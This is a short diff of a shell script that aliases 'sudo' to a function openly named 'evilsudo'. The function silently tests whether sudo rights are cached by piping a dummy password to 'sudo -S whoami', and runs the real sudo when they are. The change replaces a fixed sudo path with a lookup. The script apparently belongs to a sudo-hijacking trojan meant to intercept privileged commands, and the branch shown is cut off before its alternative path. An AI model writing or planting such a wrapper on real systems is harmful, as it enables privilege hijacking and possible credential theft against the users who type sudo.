@@ -7,7 +7,7 @@
 alias sudo=evilsudo
 function evilsudo() {
 	if [ "$#" -gt "0" ]; then
-		rights=$(echo "a" | /usr/bin/sudo -S whoami 2>/dev/null)
+		rights=$(echo "a" | $(which sudo) -S whoami 2>/dev/null)
 		if [ "$rights" == "root" ]; then
 			$(which sudo) $@
 		else
